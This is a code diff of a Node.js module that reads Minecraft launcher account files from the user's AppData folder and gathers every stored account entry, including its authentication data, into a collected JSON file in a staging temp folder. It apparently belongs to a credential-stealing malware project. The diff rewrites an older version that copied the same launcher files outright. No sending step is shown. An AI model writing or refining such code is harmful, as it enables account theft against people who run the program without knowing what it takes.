@@ -1,14 +1,23 @@
-const { roamingAppData } = require('../util/variables');
-const { join } = require('path');
+const { join, sep } = require('path');
 const fs = require('fs');
 const { tempFolder } = require('../index');
 
-const path = join(roamingAppData, '.minecraft');
-fs.mkdirSync(join(tempFolder, 'Minecraft'));
-const files = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt'];
+fs.writeFileSync(join(tempFolder, 'Minecraft Accounts.json'), '[]');
+const paths = [
+  join(process.env.APPDATA, '.minecraft', 'launcher_accounts.json'),
+  join(process.env.APPDATA, '.minecraft', 'launcher_accounts_microsoft_store.json'),
+];
 
-files.forEach(file => {
-  if (fs.existsSync(join(path, file))) {
-    fs.copyFileSync(join(path, file), join(tempFolder, 'Minecraft', file));
+paths.forEach(file => {
+  if (fs.existsSync(file)) {
+    const { accounts } = JSON.parse(fs.readFileSync(file).toString());
+    const accountsFile = JSON.parse(fs.readFileSync(join(tempFolder, 'Minecraft Accounts.json')).toString());
+    Object.keys(accounts).forEach(account => {
+      accounts[account].source = file.split(sep).slice(5, -1)[0].replace('.', '') || 'Unknown';
+      const source = accounts[account].source;
+      accounts[account].source = source.replace(source[0], source[0].toUpperCase());
+      accountsFile.push(accounts[account]);
+    });
+    fs.writeFileSync(join(tempFolder, 'Minecraft Accounts.json'), JSON.stringify(accountsFile));
   }
 });
